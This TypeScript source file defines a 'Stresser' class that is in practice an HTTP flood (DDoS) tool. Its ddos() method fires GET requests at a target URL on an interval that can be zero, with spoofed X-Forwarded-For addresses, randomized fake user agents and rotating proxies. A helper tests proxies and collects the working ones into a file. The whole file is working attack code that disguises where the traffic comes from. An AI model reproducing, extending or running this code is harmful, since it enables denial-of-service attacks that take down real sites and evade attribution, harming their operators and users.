import { URL } from 'url';
import * as fs from 'fs';

import 'overpaint.js';
import axios from 'axios';
import { faker } from '@faker-js/faker';

import { Stats } from '../types/Stats';
import { addStatic, getStatic, toHumanTime } from '../utils/Utils';
import { Counter } from './Counter';
import { StresserOptions } from '../types/StresserOptions';

export class Stresser {

   private options: StresserOptions;
   private targetURL: URL;

   private stats: Stats;
   private proxies: string[][] = [];

   private get duration(): string {
      return toHumanTime(Date.now() - this.stats.startTime, true);
   }

   private proxyIndex: number = 0;
   private get nextProxy(): string[] {
      return this.proxies[++this.proxyIndex % this.proxies.length];
   }

   constructor(options: StresserOptions) {
      // set options
      this.options = options;
      // set target URL
      this.targetURL = new URL(this.options.target);
      // import proxies
      this.importProxies();
      // init stats
      this.stats = {
         startTime: Date.now(),
         requests: new Counter(),
         pending: new Counter(),
         success: new Counter(),
         errors: new Counter(),
      };
      // start rendering terminal
      if (this.options.background) {
         this.sendDataUpdate(2);
      } else {
         throw new Error('Not implemented yet.');
         // this.renderTerminal(15);
      }
      // start stressing
      this.ddos(0);
   }

   //================================================================================================

   private sendDataUpdate(tps: number = 10) {
      setInterval(() => {
         process.send?.({
            type: 'data',
            data: {
               duration: this.duration,
               requests: this.stats.requests.count,
               pending: this.stats.pending.count,
               success: this.stats.success.count,
               errors: this.stats.errors.count
            }
         });
      }, 1000 / tps);
   }

   //================================================================================================

   // private renderFrame() {
   //    console.clear();
   //    console.log(Stresser.header, '\n');
   //    this.logs.forEach(log => console.log(log));
   //    if (this.options.debugMode) {
   //       console.log(`
   // ${("Duration:  " + this.duration)._Gray}
   // ${("Requests:  " + this.stats.requests.count)._White}
   // ${("Pending:   " + this.stats.pending.count)._OrangeGold}
   // ${("Success:   " + this.stats.success.count)._GreenApple}
   // ${("Errors:    " + this.stats.errors.count)._Red}
   //       `.trimEnd());
   //    } else {
   //       console.log(`
   // ${("Duration:  " + this.duration)._Gray}
   // ${("Requests:  " + this.stats.requests.count)._White}
   //       `.trimEnd());
   //    }
   // }

   // public renderTerminal(fps: number = 10) {
   //    this.renderFrame();
   //    setInterval(() => this.renderFrame(), 1000 / fps);
   // }

   //================================================================================================

   private async sendRequest(returnOnSuccess: boolean = false, config: any = {}) {
      try {
         this.requestSent();

         config = {
            ip: faker.internet.ipv4(),
            userAgent: faker.internet.userAgent(),
            proxy: this.nextProxy,
            ...config
         }

         let options = {
            headers: {
               'X-Forwarded-For': config.ip,
               'User-Agent': config.userAgent,
               'Accept': '*/*',
               'Accept-Language': 'en-US,en;q=0.5',
               'Accept-Encoding': 'gzip, deflate, br',
               'Referer': this.targetURL.hostname
            },
            proxy: (this.options.useProxies)
               ? {
                  host: config.proxy[0],
                  port: Number(config.proxy[1])
               } : undefined
         };

         if (this.options.debugMode) {
            const response = await axios.get(this.targetURL.href, options)
            this.requestComplete(response.status === 200);
            if (returnOnSuccess) return config;
         } else {
            axios.get(this.targetURL.href, options);
         }
      } catch (error: any) {
         this.requestComplete(false);
      }
   }

   public ddos(rps: number, config: any = {}) {
      if (typeof rps !== "number") throw new Error('Parameter "rps" must be a (positive) number.');
      if (rps === 0) {
         setInterval(() => this.sendRequest(false, config), 0);
      } else {
         setInterval(() => this.sendRequest(false, config), 1000 / rps);
      }
   }

   private async filterProxies(rps: number) {
      if (typeof rps !== "number") throw new Error('Parameter "rps" must be a (positive) number.');

      setInterval(async () => {
         let config = await this.sendRequest(true);

         if (config) {
            let proxy = config.proxy.join(':');

            let valid_proxies = getStatic('valid_proxies.txt').split('\n');
            if (valid_proxies.includes(proxy)) return;

            // this.logs.push(config.proxy.join(':')._GreenApple);

            addStatic('valid_proxies.txt', proxy + '\n');
         }
      }, 1000 / rps);
   }

   //================================================================================================

   private requestSent() {
      this.stats.requests.inc();
      this.stats.pending.inc();
   }

   private requestComplete(success: boolean) {
      if (typeof success !== "boolean") throw new Error('Parameter "success" must be true or false.');
      this.stats.pending.dec();
      (success) ? this.stats.success.inc() : this.stats.errors.inc();
      return success;
   }

   //================================================================================================

   private importProxies() {
      if (!this.options.useProxies) return;
      this.proxies = getStatic(this.options?.proxyFile).split('\n').map(proxy => proxy.split(':'));
      if (!this.proxies.length) throw new Error('No proxies found. Check the file name and try again.');
   }

}

// process.on('unhandledRejection', (error: any) => {
//    console.error(`Unhandled promise rejection: ${error.message}`);
//    process.exit(1);
// });
